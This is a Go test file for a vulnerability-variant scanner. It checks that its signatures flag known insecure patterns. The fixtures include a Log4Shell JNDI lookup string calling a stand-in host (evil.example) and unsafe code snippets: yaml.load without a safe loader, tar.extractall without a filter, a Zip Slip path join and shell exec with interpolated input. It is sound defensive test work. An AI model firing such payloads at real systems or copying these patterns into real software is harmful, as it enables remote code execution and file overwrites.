package variants

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/nox-hq/nox/core/discovery"
)

func scan(t *testing.T, name, body string) []string {
	t.Helper()
	dir := t.TempDir()
	abs := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(abs), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(abs, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	art := discovery.Artifact{Path: name, AbsPath: abs, Type: discovery.Source}
	fs, err := NewAnalyzer().ScanArtifacts(context.Background(), []discovery.Artifact{art})
	if err != nil {
		t.Fatal(err)
	}
	var ids []string
	items := fs.Findings()
	for i := range items {
		ids = append(ids, items[i].RuleID)
	}
	return ids
}

func has(ids []string, id string) bool {
	for _, x := range ids {
		if x == id {
			return true
		}
	}
	return false
}

func TestSignaturesCompile(t *testing.T) {
	a := NewAnalyzer()
	if len(a.Signatures()) == 0 {
		t.Fatal("no signatures compiled")
	}
	for _, s := range a.Signatures() {
		if s.re == nil {
			t.Errorf("signature %s did not compile", s.ID)
		}
		if s.CVE == "" {
			t.Errorf("signature %s has no CVE", s.ID)
		}
	}
}

func TestLog4Shell(t *testing.T) {
	ids := scan(t, "Config.java", `logger.info("User-Agent: ${jndi:ldap://evil.example/a}");`)
	if !has(ids, "VARIANT-001") {
		t.Errorf("expected VARIANT-001 (Log4Shell); got %v", ids)
	}
}

func TestPyYAMLUnsafeVsSafe(t *testing.T) {
	unsafe := scan(t, "load.py", "import yaml\ndata = yaml.load(untrusted)\n")
	if !has(unsafe, "VARIANT-002") {
		t.Errorf("expected VARIANT-002 for yaml.load without Loader; got %v", unsafe)
	}
	safe := scan(t, "load.py", "import yaml\ndata = yaml.load(untrusted, Loader=yaml.SafeLoader)\n")
	if has(safe, "VARIANT-002") {
		t.Errorf("yaml.load with SafeLoader must not fire VARIANT-002; got %v", safe)
	}
	safe2 := scan(t, "load.py", "data = yaml.safe_load(untrusted)\n")
	if has(safe2, "VARIANT-002") {
		t.Errorf("yaml.safe_load must not fire VARIANT-002; got %v", safe2)
	}
}

func TestTarExtractAllFilter(t *testing.T) {
	unsafe := scan(t, "x.py", "tar.extractall(dest)\n")
	if !has(unsafe, "VARIANT-003") {
		t.Errorf("expected VARIANT-003 for extractall without filter; got %v", unsafe)
	}
	safe := scan(t, "x.py", "tar.extractall(dest, filter='data')\n")
	if has(safe, "VARIANT-003") {
		t.Errorf("extractall with filter must not fire; got %v", safe)
	}
}

func TestZipSlip(t *testing.T) {
	ids := scan(t, "Unzip.java", `File f = new File(destDir, entry.getName());`)
	if !has(ids, "VARIANT-004") {
		t.Errorf("expected VARIANT-004 (Zip Slip); got %v", ids)
	}
}

func TestNodeExecInjection(t *testing.T) {
	ids := scan(t, "run.ts", "exec(`ls ${userDir}`);")
	if !has(ids, "VARIANT-006") {
		t.Errorf("expected VARIANT-006 (exec injection); got %v", ids)
	}
	safe := scan(t, "run.ts", "execFile('ls', [userDir]);")
	if has(safe, "VARIANT-006") {
		t.Errorf("execFile with arg array must not fire; got %v", safe)
	}
}

func TestExtScoping(t *testing.T) {
	// The Python yaml signature must not fire on a JS file.
	ids := scan(t, "app.js", "yaml.load(x)\n")
	if has(ids, "VARIANT-002") {
		t.Errorf("python-scoped VARIANT-002 fired on .js; got %v", ids)
	}
}
